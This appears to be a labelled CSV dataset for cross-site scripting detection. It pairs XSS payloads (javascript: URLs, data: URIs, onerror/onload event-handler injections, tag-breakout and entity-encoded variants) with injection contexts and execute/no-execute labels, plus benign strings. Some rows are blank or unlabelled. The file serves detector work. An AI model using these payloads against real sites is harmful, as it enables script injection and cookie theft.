payload,context,exec
,,
javascript:alert(document.title),url_href,1
,,
javascript:alert(navigator.userAgent),url_href,1
,,
javascript:alert(history.length),url_href,1
javascript:prompt(1),url_navigation,1
javascript:alert(1),url_href,1
javascript:alert(1),url_navigation,1
javascript:confirm(1),url_navigation,1
javascript:confirm(1),url_href,1
javascript:prompt(1),url_href,1
"data:text/html,<script>alert(1)</script>",url_navigation,1
"data:text/html,<script>alert(document.domain)</script>",url_navigation,1
"data:text/html,<img src=x onerror=alert(1)>",url_navigation,1
"data:text/html,<svg onload=alert(1)>",url_navigation,1
"data:text/html,<script>confirm(1)</script>",url_navigation,1
"data:text/html,<script>prompt(1)</script>",url_navigation,1
"data:text/html,<script>alert(document.cookie)</script>",url_navigation,1
</pre><svg/onload=alert`1`>,html_tag,1
</pre><img src=x onerror=alert`1`>,html_tag,1
</pre><details open ontoggle=alert(1)>,html_tag,1
,,
</pre><marquee onmouseover=alert(1)>hover me</marquee,html_tag,1
</pre><body onload=alert(1)>,html_tag,1
<IMG SRC=x ONERROR=alert(1)>,html_tag,1
<svg OnLoAd=alert(1)>,html_tag,1
<svg/onload=alert(String.fromCharCode(49))>,html_tag,1
<img src=x onerror=alert&#40;1&#41;>,html_tag,1
<img src=x onerror=alert&#x28;1&#x29;>,html_tag,1
<svg/onload=alert(1)>,html_tag,1
<svg/onload=alert`XSS`>,html_tag,1
<img src=x onerror=alert(1)//>,html_tag,1
<img src=x onerror=alert(1)//,html_tag,1
<svg/onload=confirm`1`>,html_tag,1
,,
""" autofocus onfocus=alert(1) x=""",html_attribute,1
,,
""" onpointerover=alert(1) """,html_attribute,1
,,
""" onwheel=alert(1) """,html_attribute,1
,,
""" onauxclick=alert(1) """,html_attribute,1
,,
,,
,,
,,
,,
,,
""";confirm(1);//",script_block,1
,script_block,
""";alert(1);//",script_block,1
,,
,,
,,
<video src=x onerror=alert(1)>,html_tag,1
<audio src=x onerror=alert(1)>,html_tag,1
,,
<source onerror=alert(1)>,html_tag,1
,,
<track onerror=alert(1)>,html_tag,
<meter onmouseover=alert(1)>,html_tag,1
"<iframe srcdoc=""<script>alert(1)</script>"">",html_tag,1
<iframe src=javascript:alert(1)>,html_tag,1
"<iframe src=""data:text/html,<script>alert(1)</script>"">",html_tag,1
"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",html_tag,1
"<iframe srcdoc=""<svg onload=alert(1)>"">",html_tag,1
"""><svg/onload=alert(1)>",html_tag,1
"""><svg/onload=alert(1)>",html_attribute,1
"""><img src=x onerror=alert(1)>",html_tag,1
"""><img src=x onerror=alert(1)>",html_attribute,1
</script><svg/onload=alert(1)>,html_tag,1
</script><svg/onload=alert(1)>,script_block,1
</title><svg/onload=alert(1)>,html_tag,1
</textarea><svg/onload=alert(1)>,html_tag,1
<img src=x onerror=alert(1)>,html_tag,1
javascript:alert`1`,url_href,1
,,
javascript:alert(String.fromCharCode(49)),url_href,1
,,
javascript:confirm`1`,url_href,1
,,
javascript:prompt`1`,url_href,1
"data:text/html,<svg/onload=alert(1)>",url_navigation,1
,,
,,
,,
,,
,,
,,
,,
,,
hello,html_text,0
john,html_text,0
admin_user,html_text,0
test@example.com,html_text,0
sam@gmail.com,html_text,0
3136783421,html_text,0
id=123,html_text,0
page=home,html_text,0
search=laptop,html_text,0
category=electronics,html_text,0
sort=price_asc,html_text,0
C++ programming,html_text,0
price > 100,html_text,0
5 < 10,html_text,0
if (x > y),html_text,0
AT&T,html_text,0
 R&D department,html_text,0
<b>hello</b>,html_text,0
<i>text</i>,html_text,0
<div>content</div>,html_text,0
<p>this is paragraph</p>,html_text,0
world,html_text,0
test123,html_text,0
username,html_text,0
admin,html_text,0
guest,html_text,0
abdDEF,html_text,0
sample_input,html_text,0
data123,html_text,0
nothing_here,html_text,0
safeText,html_text,0
just_a_string,html_text,0
randomvalue,html_text,0
plaininput,html_text,0
normaltext,html_text,0
simpledata,html_text,0
harmless,html_text,0
example123,html_text,0
inputdata,html_text,0
textonly,html_text,0
<,html_text,0
>,html_text,0
<<>>,html_text,0
<><><>,html_text,0
<<test>>,html_text,0
<hello>,html_text,0
<random>,html_text,0
<tag>,html_text,0
<notatag,html_text,0
tag>,html_text,0
&lt;,html_text,0
&gt;,html_text,0
&amp;,html_text,0
"""quotes""",html_text,0
'singlequotes',html_text,0
"""mixed'quotes""",html_text,0
(1+1),html_text,0
{test},html_text,0
[test],html_text,0
#hashtag,html_text,0
<script>,html_text,0
</script>,html_text,0
<script>alert</script,html_text,0
<script>alert</script>,html_text,0
<script>alert(1),html_text,0
alert(1),html_text,0
confirm(1),html_text,0
prompt(1),html_text,0
javascript:alert(1),html_text,0
onerror=alert(1),html_text,0
onload=alert(1),html_text,0
<img src=x>,html_text,0
<svg>,html_text,0
<iframe>,html_text,0
<body>,html_text,0
</body>,html_text,0
<img src=x onerror>,html_text,0
<svg onload>,html_text,0
<a href>,html_text,0
<video>,html_text,0
<script>alert(1),html_text,0
<img src=x onerror=,html_text,0
<svg onload=,html_text,0
"<a href=""javascript:"">",html_text,0
javascript:,html_text,0
"data:text/html,",html_text,0
<script>,html_text,0
</img>,html_text,0
<iframe src=>,html_text,0
<img src>,html_text,0
<svg/,html_text,0
<<script>>,html_text,0
<alert>,html_text,0
<onload>,html_text,0
<randomtag>,html_text,0
</randomtag>,html_text,0
<img alt=test>,html_text,0
<a test>,html_text,0
<tag attribute>,html_text,0
<tag attribute=value>,html_text,0
%3Cscript%3E,html_text,0
%3Cimg%3E,html_text,0
%3Csvg%3E,html_text,0
%3Ciframe%3E,html_text,0
%3Cbody%3E,html_text,0
%3Calert%3E,html_text,0
%3Ctest%3E,html_text,0
%3Ctag%3E,html_text,0
%3Cdiv%3E,html_text,0
%3Cspan%3E,html_text,0
&#60;script&#62;,html_text,0
&#60;img&#62;,html_text,0
&#60;svg&#62;,html_text,0
&#60;iframe&#62;,html_text,0
&#60;body&#62;,html_text,0
&#60;tag&#62;,html_text,0
&#x3C;script&#x3E;,html_text,0
&#x3C;img&#x3E;,html_text,0
&#x3C;svg&#x3E;,html_text,0
&#x3C;iframe&#x3E;,html_text,0
onmouseover=alert,html_text,0
onclick=test,html_text,0
onload=run,html_text,0
onerror=fail,html_text,0
href=link,html_text,0
src=image,html_text,0
value=test,html_text,0
type=text,html_text,0
name=user,html_text,0
id=123,html_text,0
class=box,html_text,0
style=color,html_text,0
width=100,html_text,0
height=200,html_text,0
alt=image,html_text,0
title=hello,html_text,0
placeholder=name,html_text,0
maxlength=10,html_text,0
readonly=true,html_text,0
disabled=false,html_text,0
hello,html_tag,0
hello,html_attribute,0
alert(1),script_block,0
confirm(1),script_block,0
prompt(1),script_block,0
,,
javascript:,url_href,0
,,
,,
onload=alert(1),html_attribute,0
onmouseover=alert(1),script_block,0
,,
onclick=test,html_attribute,0
,,
,,
onmouseover=alert(1),html_tag,0
,,
<img src=x onerror=alert(1)>,script_block,0
<img src=x onerror=alert(1)>,html_attribute,0
onload=alert(1),script_block,0
onload=alert(1),html_tag,0
<img src=x>,html_tag,0
<img src=x>,html_attribute,0
<img src=x>,script_block,0
<svg>,html_tag,0
<svg>,html_attribute,0
<svg>,script_block,0
<iframe>,html_attribute,0
<iframe>,html_tag,0
<iframe>,script_block,0
<body>,html_attribute,0
<body>,html_tag,0
<body>,script_block,0
%3Cscript%3E,html_attribute,0
%3Cscript%3E,html_tag,0
%3Cscript%3E,script_block,0
%3Cscript%3E,url_href,0
&#60;script&#62;,html_attribute,0
&#60;script&#62;,html_tag,0
&#60;script&#62;,script_block,0
&#60;script&#62;,url_href,0
&#x3C;script&#x3E;,html_attribute,0
&#x3C;script&#x3E;,html_tag,0
&#x3C;script&#x3E;,script_block,0
&#x3C;script&#x3E;,url_href,0
<script>alert(1),html_attribute,0
<script>alert(1),html_tag,0
<script>alert(1),script_block,0
<script>alert(1),url_href,0
<img src=x onerror=,html_attribute,0
<img src=x onerror=,html_tag,0
<img src=x onerror=,script_block,0
<img src=x onerror=,url_href,0
<svg onload,html_attribute,0
<svg onload,html_tag,0
<svg onload,script_block,0
<svg onload,url_href,0
href=link,html_attribute,0
href=link,html_tag,0
href=link,script_block,0
href=link,url_href,0
src=image,html_attribute,0
src=image,html_tag,0
src=image,script_block,0
src=image,url_href,0
value=test,html_attribute,0
value=test,html_tag,0
value=test,script_block,0
value=test,url_href,0
type=text,html_attribute,0
type=text,html_tag,0
type=text,script_block,0
type=text,url_href,0
"<scr<script>ipt>alert(1)</scr</script>ipt>		",html_text,0
"<scr<script>ipt>alert(1)</scr</script>ipt>		",html_attribute,0
"<scr<script>ipt>alert(1)</scr</script>ipt>		",html_tag,0
"<scr<script>ipt>alert(1)</scr</script>ipt>		",script_block,0
"<scr<script>ipt>alert(1)</scr</script>ipt>		",url_href,0
javascript:alert(1),html_attribute,0
javascript:alert(1),html_tag,0
javascript:alert(1),script_block,0
;alert(1);//,html_text,0
;alert(1);//,html_attribute,0
;alert(1);//,html_tag,0
;alert(1);//,script_block,0
;alert(1);//,url_href,0
""";alert(1);//",html_text,0
""";alert(1);//",html_attribute,0
""";alert(1);//",html_tag,0
""";alert(1);//",url_href,0
""";alert(1);//",script_block,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,html_text,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,html_tag,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,html_attribute,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,script_block,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,url_href,0
`;alert(1);//,html_text,0
`;alert(1);//,html_attribute,0
`;alert(1);//,html_tag,0
`;alert(1);//,script_block,0
`;alert(1);//,url_href,0
""" onmouseover=alert(1) """,html_text,0
""" onmouseover=alert(1) """,html_tag,0
""" onmouseover=alert(1) """,script_block,0
""" onmouseover=alert(1) """,url_href,0
""" onclick=alert(1) """,html_text,0
""" onclick=alert(1) """,html_tag,0
""" onclick=alert(1) """,url_href,0
""" onclick=alert(1) """,script_block,0
""" onmouseenter=alert(1) """,html_text,0
""" onmouseenter=alert(1) """,html_tag,0
""" onmouseenter=alert(1) """,script_block,0
""" onmouseenter=alert(1) """,url_href,0
""" onmouseleave=alert(1) """,html_tag,0
""" onmouseleave=alert(1) """,script_block,0
""" onmouseleave=alert(1) """,html_text,0
""" onkeyup=alert(1) """,html_text,0
""" onkeyup=alert(1) """,html_tag,0
""" onkeyup=alert(1) """,script_block,0
""" oninput=alert(1) """,html_tag,0
""" oninput=alert(1) """,html_text,0
""" oninput=alert(1) """,script_block,0
;alert(document.domain);//,html_text,0
;alert(document.domain);//,html_attribute,0
;alert(document.domain);//,html_tag,0
;alert(document.domain);//,url_href,0
""";confirm(1);//",html_text,0
""";confirm(1);//",html_tag,0
""";confirm(1);//",html_attribute,0
""";confirm(1);//",url_href,0
""";prompt(1);//",html_text,0
""";prompt(1);//",html_attribute,0
""";prompt(1);//",html_tag,0
""";prompt(1);//",url_href,0
""";alert(document.cookie);//",html_tag,0
""";alert(document.cookie);//",html_text,0
""";alert(document.cookie);//",html_attribute,0
""";alert(document.cookie);//",url_href,0
""";alert(location);//",html_text,0
""";alert(location);//",html_attribute,0
""";alert(location);//",html_tag,0
""";alert(window.origin);//",html_text,0
""";alert(window.origin);//",html_tag,0
""";alert(window.origin);//",html_attribute,0
</pre><marquee onstart=alert(1)>,html_tag,0
</pre><marquee onstart=alert(1)>,html_text,0
</pre><marquee onstart=alert(1)>,html_attribute,0
</pre><marquee onstart=alert(1)>,script_block,0
;alert(navigator.userAgent);//,html_tag,0
;alert(navigator.userAgent);//,html_attribute,0
;alert(navigator.userAgent);//,html_text,0
;alert(navigator.userAgent);//,url_href,0
;alert(document.title);//,html_text,0
;alert(document.title);//,html_tag,0
;alert(document.title);//,html_attribute,0
;alert(document.title);//,url_href,0
;alert(history.length);//,html_text,0
;alert(history.length);//,html_attribute,0
;alert(history.length);//,html_tag,0
;alert(history.length);//,url_href,0
"data:text/html,<script>alert(1)</script>",html_text,0
"data:text/html,<script>alert(1)</script>",html_attribute,0
"data:text/html,<script>alert(1)</script>",html_tag,0
"data:text/html,<script>alert(1)</script>",script_block,0
"data:text/html,<script>alert(1)</script>",url_href,0
"data:text/html,<script>alert(document.domain)</script>",html_text,0
"data:text/html,<script>alert(document.domain)</script>",html_attribute,0
"data:text/html,<script>alert(document.domain)</script>",html_tag,0
"data:text/html,<script>alert(document.domain)</script>",url_href,0
"data:text/html,<script>alert(document.domain)</script>",script_block,0
"data:text/html,<img src=x onerror=alert(1)>",html_text,0
"data:text/html,<img src=x onerror=alert(1)>",html_attribute,0
"data:text/html,<img src=x onerror=alert(1)>",html_tag,0
"data:text/html,<img src=x onerror=alert(1)>",script_block,0
"data:text/html,<img src=x onerror=alert(1)>",url_href,0
"data:text/html,<svg onload=alert(1)>",html_text,0
"data:text/html,<svg onload=alert(1)>",html_tag,0
"data:text/html,<svg onload=alert(1)>",html_attribute,0
"data:text/html,<svg onload=alert(1)>",script_block,0
"data:text/html,<svg onload=alert(1)>",url_href,0
"data:text/html,<script>confirm(1)</script>",html_text,0
"data:text/html,<script>confirm(1)</script>",html_tag,0
"data:text/html,<script>confirm(1)</script>",html_attribute,0
"data:text/html,<script>confirm(1)</script>",script_block,0
"data:text/html,<script>confirm(1)</script>",url_href,0
"data:text/html,<script>prompt(1)</script>",html_text,0
"data:text/html,<script>prompt(1)</script>",html_tag,0
"data:text/html,<script>prompt(1)</script>",html_attribute,0
"data:text/html,<script>prompt(1)</script>",script_block,0
"data:text/html,<script>prompt(1)</script>",url_href,0
"data:text/html,<script>alert(document.cookie)</script>",html_text,0
"data:text/html,<script>alert(document.cookie)</script>",html_attribute,0
"data:text/html,<script>alert(document.cookie)</script>",html_tag,0
"data:text/html,<script>alert(document.cookie)</script>",script_block,0
"data:text/html,<script>alert(document.cookie)</script>",url_href,0
</pre><svg/onload=alert`1`>,html_text,0
</pre><svg/onload=alert`1`>,html_attribute,0
</pre><svg/onload=alert`1`>,script_block,0
</pre><svg/onload=alert`1`>,url_href,0
</pre><img src=x onerror=alert`1`>,html_text,0
</pre><img src=x onerror=alert`1`>,html_attribute,0
</pre><img src=x onerror=alert`1`>,script_block,0
</pre><img src=x onerror=alert`1`>,url_href,0
</pre><details open ontoggle=alert(1)>,html_text,0
</pre><details open ontoggle=alert(1)>,html_attribute,0
</pre><details open ontoggle=alert(1)>,script_block,0
</pre><details open ontoggle=alert(1)>,url_href,0
</pre><marquee onmouseover=alert(1)>hover me</marquee,html_text,0
</pre><marquee onmouseover=alert(1)>hover me</marquee,html_attribute,0
</pre><marquee onmouseover=alert(1)>hover me</marquee,script_block,0
</pre><marquee onmouseover=alert(1)>hover me</marquee,url_href,0
</pre><body onload=alert(1)>,html_text,0
</pre><body onload=alert(1)>,html_attribute,0
</pre><body onload=alert(1)>,script_block,0
</pre><body onload=alert(1)>,url_href,0
<IMG SRC=x ONERROR=alert(1)>,html_text,0
<IMG SRC=x ONERROR=alert(1)>,html_attribute,0
<IMG SRC=x ONERROR=alert(1)>,script_block,0
<IMG SRC=x ONERROR=alert(1)>,url_href,0
<svg OnLoAd=alert(1)>,html_text,0
<svg OnLoAd=alert(1)>,html_attribute,0
<svg OnLoAd=alert(1)>,script_block,0
<svg OnLoAd=alert(1)>,url_href,0
<svg/onload=alert(String.fromCharCode(49))>,html_text,0
<svg/onload=alert(String.fromCharCode(49))>,html_attribute,0
<svg/onload=alert(String.fromCharCode(49))>,script_block,0
<svg/onload=alert(String.fromCharCode(49))>,url_href,0
<img src=x onerror=alert&#40;1&#41;>,html_text,0
<img src=x onerror=alert&#40;1&#41;>,html_attribute,0
<img src=x onerror=alert&#40;1&#41;>,script_block,0
<img src=x onerror=alert&#40;1&#41;>,url_href,0
<img src=x onerror=alert&#x28;1&#x29;>,html_text,0
<img src=x onerror=alert&#x28;1&#x29;>,html_attribute,0
<img src=x onerror=alert&#x28;1&#x29;>,script_block,0
<img src=x onerror=alert&#x28;1&#x29;>,url_href,0
<svg/onload=alert(1)>,html_text,0
<svg/onload=alert(1)>,html_attribute,0
<svg/onload=alert(1)>,script_block,0
<svg/onload=alert(1)>,url_href,0
<svg/onload=alert`XSS`>,html_text,0
<svg/onload=alert`XSS`>,html_attribute,0
<svg/onload=alert`XSS`>,script_block,0
<svg/onload=alert`XSS`>,url_href,0
<img src=x onerror=alert(1)//>,html_text,0
<img src=x onerror=alert(1)//>,html_attribute,0
<img src=x onerror=alert(1)//>,script_block,0
<img src=x onerror=alert(1)//>,url_href,0
<img src=x onerror=alert(1)//,html_text,0
<img src=x onerror=alert(1)//,html_attribute,0
<img src=x onerror=alert(1)//,script_block,0
<img src=x onerror=alert(1)//,url_href,0
<svg/onload=confirm`1`>,html_text,0
<svg/onload=confirm`1`>,html_attribute,0
<svg/onload=confirm`1`>,script_block,0
<svg/onload=confirm`1`>,url_href,0
 autofocus onfocus=alert(1) x=,html_text,0
 autofocus onfocus=alert(1) x=,html_attribute,0
 autofocus onfocus=alert(1) x=,script_block,0
 autofocus onfocus=alert(1) x=,url_href,0
 onpointerover=alert(1) ,html_text,0
 onpointerover=alert(1) ,html_attribute,0
 onpointerover=alert(1) ,url_href,0
 onpointerover=alert(1) ,script_block,0
<meter onmouseover=alert(1)>,html_text,0
<meter onmouseover=alert(1)>,html_attribute,0
<meter onmouseover=alert(1)>,script_block,0
<meter onmouseover=alert(1)>,url_href,0
"<iframe srcdoc=""<script>alert(1)</script>"">",html_text,0
"<iframe srcdoc=""<script>alert(1)</script>"">",html_attribute,0
"<iframe srcdoc=""<script>alert(1)</script>"">",script_block,0
"<iframe srcdoc=""<script>alert(1)</script>"">",url_href,0
<iframe src=javascript:alert(1)>,html_text,0
<iframe src=javascript:alert(1)>,html_attribute,0
<iframe src=javascript:alert(1)>,script_block,0
<iframe src=javascript:alert(1)>,url_href,0
"<iframe src=""data:text/html,<script>alert(1)</script>"">",html_text,0
"<iframe src=""data:text/html,<script>alert(1)</script>"">",html_attribute,0
"<iframe src=""data:text/html,<script>alert(1)</script>"">",script_block,0
"<iframe src=""data:text/html,<script>alert(1)</script>"">",url_href,0
"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",html_text,0
"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",html_attribute,0
"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",script_block,0
"<iframe srcdoc=""<img src=x onerror=alert(1)>"">",url_href,0
"<iframe srcdoc=""<svg onload=alert(1)>"">",html_text,0
"<iframe srcdoc=""<svg onload=alert(1)>"">",html_attribute,0
"<iframe srcdoc=""<svg onload=alert(1)>"">",script_block,0
"<iframe srcdoc=""<svg onload=alert(1)>"">",url_href,0
><svg/onload=alert(1)>,html_text,0
><svg/onload=alert(1)>,script_block,0
><svg/onload=alert(1)>,url_href,0
><img src=x onerror=alert(1)>,html_text,0
><img src=x onerror=alert(1)>,script_block,0
><img src=x onerror=alert(1)>,url_href,0
</script><svg/onload=alert(1)>,html_text,0
</script><svg/onload=alert(1)>,html_attribute,0
</script><svg/onload=alert(1)>,url_href,0
</title><svg/onload=alert(1)>,html_text,0
</title><svg/onload=alert(1)>,html_attribute,0
</title><svg/onload=alert(1)>,script_block,0
</title><svg/onload=alert(1)>,url_href,0
</textarea><svg/onload=alert(1)>,html_text,0
</textarea><svg/onload=alert(1)>,html_attribute,0
</textarea><svg/onload=alert(1)>,script_block,0
</textarea><svg/onload=alert(1)>,url_href,0
javascript:alert`1`,html_text,0
javascript:alert`1`,html_attribute,0
javascript:alert`1`,html_tag,0
javascript:alert`1`,script_block,0
javascript:alert(String.fromCharCode(49)),html_text,0
javascript:alert(String.fromCharCode(49)),html_tag,0
javascript:alert(String.fromCharCode(49)),html_attribute,0
javascript:alert(String.fromCharCode(49)),script_block,0
javascript:confirm`1`,html_text,0
javascript:confirm`1`,html_tag,0
javascript:confirm`1`,html_attribute,0
javascript:confirm`1`,script_block,0
javascript:prompt`1`,html_text,0
javascript:prompt`1`,html_attribute,0
javascript:prompt`1`,html_tag,0
javascript:prompt`1`,script_block,0
"data:text/html,<svg/onload=alert(1)>",html_text,0
"data:text/html,<svg/onload=alert(1)>",html_attribute,0
"data:text/html,<svg/onload=alert(1)>",html_tag,0
"data:text/html,<svg/onload=alert(1)>",script_block,0
"data:text/html,<svg/onload=alert(1)>",url_href,0
 onblur=alert(1) ,html_text,0
 onblur=alert(1) ,html_tag,0
 onblur=alert(1) ,script_block,0
 onblur=alert(1) ,url_href,0
""" onfocus=alert(1) autofocus """,html_text,0
""" onfocus=alert(1) autofocus """,html_tag,0
""" onfocus=alert(1) autofocus """,script_block,0
""" onfocus=alert(1) autofocus """,url_href,0
<source onerror=alert(1)>,html_text,0
<source onerror=alert(1)>,script_block,0
<source onerror=alert(1)>,html_attribute,0
<source onerror=alert(1)>,url_href,0
javascript:alert(1),html_text,0
javascript:alert(1),html_attribute,0
javascript:alert(1),html_tag,0
javascript:alert(1),script_block,0
javascript:prompt(1),html_text,0
javascript:prompt(1),html_tag,0
javascript:prompt(1),html_attribute,0
javascript:prompt(1),script_block,0
javascript:confirm(1),html_text,0
javascript:confirm(1),html_tag,0
javascript:confirm(1),html_attribute,0
javascript:confirm(1),script_block,0
